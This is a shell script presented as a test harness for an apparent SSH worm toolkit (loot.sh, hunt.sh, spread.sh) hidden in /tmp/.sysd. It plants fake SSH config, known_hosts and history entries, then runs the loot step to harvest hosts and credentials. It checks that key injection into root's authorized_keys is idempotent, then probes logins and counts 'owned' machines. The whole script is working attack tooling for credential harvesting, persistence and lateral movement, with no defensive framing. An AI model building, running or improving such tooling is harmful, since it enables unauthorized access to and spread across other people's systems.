#!/bin/sh
# throwaway: end-to-end test of loot.sh + probe ordering on this host
echo "=== syntax on host ==="
for f in loot.sh hunt.sh spread.sh; do
    printf '%s: ' "$f"
    sh -n "/tmp/.sysd/$f" && echo OK
done

echo
echo "=== fixtures: an ssh config, known_hosts and history to parse ==="
mkdir -p /root/.ssh
if [ ! -f /root/.ssh/config ]; then
    cat > /root/.ssh/config <<'EOF'
Host box2
    HostName 5.161.247.9
    User root
    IdentityFile ~/.ssh/id_key

Host self
    HostName 167.233.74.146
    User root
EOF
    echo "wrote /root/.ssh/config"
fi
grep -q 10.77.0.9 /root/.ssh/known_hosts 2>/dev/null || \
    printf '10.77.0.9,10.77.0.10 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXAMPLE\n' >> /root/.ssh/known_hosts
grep -q 'deploy@10.99.0.5' /root/.bash_history 2>/dev/null || \
    printf 'ssh deploy@10.99.0.5 -p 2222\nscp -i ~/.ssh/k root@10.99.0.6:/x .\n' >> /root/.bash_history
chmod 0600 /root/.ssh/config /root/.ssh/known_hosts
echo "fixtures ready"

echo
echo "=== loot run ==="
sh /tmp/.sysd/loot.sh

echo
echo "=== loot.txt (first 30) ==="
head -30 /tmp/.sysd/.hunt/loot.txt

echo
echo "=== authorized_keys is idempotent ==="
echo "lines: $(wc -l < /root/.ssh/authorized_keys 2>/dev/null || echo 0)"
sh /tmp/.sysd/loot.sh >/dev/null 2>&1
echo "after a second loot: $(wc -l < /root/.ssh/authorized_keys 2>/dev/null || echo 0)"

echo
echo "=== probe: first attempts must be loot rows, cap 40 ==="
HUNT_MAX_PROBE=40 sh /tmp/.sysd/hunt.sh probe
echo
echo "login OK lines:"
grep -c 'login OK' /tmp/.sysd/.hunt/seen.txt 2>/dev/null || true
echo "owned: $(wc -l < /tmp/.sysd/.hunt/owned.txt)"
echo "=== DONE ==="
